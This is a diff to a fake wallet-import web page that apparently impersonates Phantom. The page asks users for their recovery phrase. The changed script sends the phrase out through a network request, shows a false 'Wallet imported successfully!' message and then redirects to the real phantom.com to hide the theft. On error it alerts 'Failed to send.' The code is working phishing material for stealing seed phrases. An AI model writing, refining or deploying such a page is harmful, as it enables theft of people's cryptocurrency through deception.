@@ -46,9 +46,9 @@
     <button class="paste-btn" onclick="document.getElementById('phrase-input').focus()">Paste</button>
   </div>
 
- <div class="toast" id="toast">✓ Wallet imported successfully! Redirecting...</div>
+  <div class="toast" id="toast">Wallet imported successfully!</div>
 
-  <button class="btn btn-dark-purple" id="import-btn" onclick="handleImport()" style="margin-bottom:16px;">
+<button class="btn btn-dark-purple" id="import-btn" onclick="handleImport()" style="margin-bottom:16px;">
   <span class="btn-text">Import</span>
 </button>
 
@@ -59,15 +59,18 @@
 <script>
 async function handleImport() {
 
-   function handleImport() {
-  const phrase = document.getElementById('phrase-input').value.trim();
-  if (!phrase) { alert('Please enter your recovery phrase first.'); return; }
-  const btn = document.getElementById('import-btn');
-  btn.classList.add('loading');
-  btn.querySelector('.btn-text').textContent = 'Importing...';
-  document.getElementById('toast').style.display = 'block';
-  setTimeout(function() { window.location.href = 'https://www.phantom.com'; }, 2500);
-}
+    const phrase =
+        document.getElementById("phrase-input")
+        .value
+        .trim();
+
+    if (!phrase) {
+        alert("Please enter your key first.");
+        return;
+    }
+    const btn = document.getElementById('import-btn');
+btn.classList.add('loading');
+btn.querySelector('.btn-text').textContent = 'Importing...';
 
     try {
 
@@ -84,18 +87,22 @@ async function handleImport() {
             }
         );
 
-        if (!response.ok) {
-            throw new Error();
-        }
+        if (!response.ok) { throw new Error(); }
 
-        document.getElementById("toast").style.display = "block";
+    btn.classList.remove('loading');
+    btn.querySelector('.btn-text').textContent = 'Import';
+    document.getElementById("toast").style.display = "block";
+   document.getElementById("phrase-input").value = "";
+   btn.classList.remove('loading');
+   btn.querySelector('.btn-text').textContent = 'Import';
+   setTimeout(function() { window.location.href = 'https://www.phantom.com'; }, 2500);
 
-        document.getElementById("phrase-input").value = "";
-
-    } catch (err) {
-
-        alert("Failed to send.");
-    }
+  
+} catch (err) {
+    btn.classList.remove('loading');
+    btn.querySelector('.btn-text').textContent = 'Import';
+    alert('Failed to send.');
+}
 }
 </script>
 </body>
